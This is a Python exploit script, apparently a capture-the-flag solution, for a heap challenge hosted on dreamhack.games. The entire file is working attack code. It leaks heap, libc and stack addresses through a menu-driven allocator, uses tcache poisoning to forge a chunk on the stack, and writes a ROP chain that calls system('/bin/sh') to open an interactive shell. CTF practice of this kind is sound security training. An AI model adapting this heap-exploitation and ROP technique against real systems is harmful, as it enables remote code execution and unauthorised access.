#!/usr/bin/env python
import sys
import ptrlib as ptr
import pwn

exe = ptr.ELF("./prob_patched")
pwn.context.binary = pwn.ELF(exe.filepath)
libc = ptr.ELF("./libc.so.6")
# ld = ptr.ELF("")

remote = len(sys.argv) > 1 and sys.argv[1] == "remote"

def connect():
    if remote:
        return pwn.remote("host3.dreamhack.games", 10332)
    else:
        return pwn.process(exe.filepath)

def unwrap(x):
    if x is None:
        ptr.logger.error("Failed to unwrap")
        exit(1)
    else:
        return x

def main():
    io = connect()

    def alloc(idx: int, type: int,value: int = 0, length: int = 0, data: bytes = b"", line=True):
        io.sendlineafter(b">> ", b"1")
        io.sendlineafter(b"Index: ", str(idx).encode())
        io.sendlineafter(b"Type: ", str(type).encode())
        if 0<=type<=3:
            io.sendlineafter(b"Value: ", str(value).encode())
        elif type == 4:
            io.sendlineafter(b"Length: ", str(length).encode())
            if length != 0:
                if line:
                    io.sendlineafter(b"Data: ", data)
                else:
                    io.sendafter(b"Data: ", data)
        return

    def free(idx: int):
        io.sendlineafter(b">> ", b"2")
        io.sendlineafter(b"Index: ", str(idx).encode())
        return

    def read(idx: int) -> bytes:
        io.sendlineafter(b">> ", b"3")
        io.sendlineafter(b"Index: ", str(idx).encode())
        io.recvuntil(b"Value: ")
        return io.recvuntil(b"1. Allocate", drop=True)

    def write(idx: int, value:int = 0, length: int = 0, data: bytes = b"", line=True):
        io.sendlineafter(b">> ", b"4")
        io.sendlineafter(b"Index: ", str(idx).encode())
        dump = io.recv(6)
        if b"Value" in dump:
            io.sendline(str(idx).encode())
        elif b"Length" in dump:
            io.sendline(str(length).encode())
            if line:
                io.sendlineafter(b"Data: ", data)
            else:
                io.sendafter(b"Data: ", data)
        return

    # heap leak
    alloc(idx=0, type=4, length = 0x18, data = b"")
    alloc(idx=1, type=4, length = 0x18, data = b"")
    free(0)
    free(1)
    alloc(idx=0, type=4, length = 0x18, data = b"")
    alloc(idx=1, type=4, length = 0x18, data = b"")
    leak1 = ptr.u64(read(0)[:8])
    leak2 = ptr.u64(read(1)[:8])
    pseudo_heap_addr = leak2 ^ leak1
    heap_base = (pseudo_heap_addr >> 12) << 12
    ptr.logger.info(f"heap_base: {hex(heap_base)}")

    # libc leak
    alloc(idx=2, type=4, length = 0x418, data = b"")
    alloc(idx=3, type=4, length = 0x18, data = b"OJAMAPUYO")
    free(2)
    free(3)
    alloc(idx=4, type=4, length = 0x28, data = b"")
    libc.base = ptr.u64(read(4)[:8]) - 0x203f0a

    # stack leak
    alloc(idx=0, type=4, length = 0x18, data = b"A") # dummy
    alloc(idx=1, type=4, length = 0x18, data = b"B")
    alloc(idx=2, type=4, length = 0x28, data = b"C")
    alloc(idx=3, type=4, length = 0x28, data = b"D")
    free(3)
    free(2)
    alloc(idx=1, type=3, value = 0xffffffff)
    alloc(idx=1, type=5)
    payload = b""
    payload += b"A" * 0x18
    payload += ptr.p64(0x21)
    payload += ptr.p64((heap_base + 0x330) >> 12 ^ (unwrap(libc.symbol("environ")) - 0x18))
    write(idx=1, length = 0, data=payload)
    alloc(idx=4, type=4, length = 0x28, data = b"E")
    alloc(idx=5, type=4, length = 0x28, data = b"F" * 0x17)
    stack_addr = ptr.u64(read(idx=5)[0x18: 0x20])
    ptr.logger.info(f"stack_addr: {hex(stack_addr)}")

    # tcache poisoning to write rop chain
    fake_chunk_addr = stack_addr - 0x168
    ptr.logger.info(f"fake_chunk_addr: {hex(fake_chunk_addr)}")
    alloc(idx=0, type=4, length = 0x38, data = b"G" * 8)
    alloc(idx=1, type=4, length = 0x38, data = b"H" * 8)
    alloc(idx=2, type=4, length = 0x38, data = b"I" * 8)
    free(2)
    free(1)
    alloc(idx=0, type=3, value = 0xffffffff)
    alloc(idx=0, type=5)
    payload = b""
    payload += b"A" * 0x38
    payload += ptr.p64(0x31)
    payload += ptr.p64((heap_base + 0x3d0) >> 12 ^ fake_chunk_addr)
    write(idx=0, length=0, data=payload)
    alloc(idx=3, type = 4, length = 0x38, data = b"J")
    payload = b""
    payload += b"A" * 0x18
    payload += ptr.p64(next(libc.gadget("ret;")))
    payload += ptr.p64(next(libc.gadget("pop rdi; ret;")))
    payload += ptr.p64(next(libc.find("/bin/sh")))
    payload += ptr.p64(unwrap(libc.symbol("system")))
    alloc(idx=3, type = 4, length = 0x38, data = payload, line=False)

    io.interactive()
    return

if __name__ == "__main__":
    main()
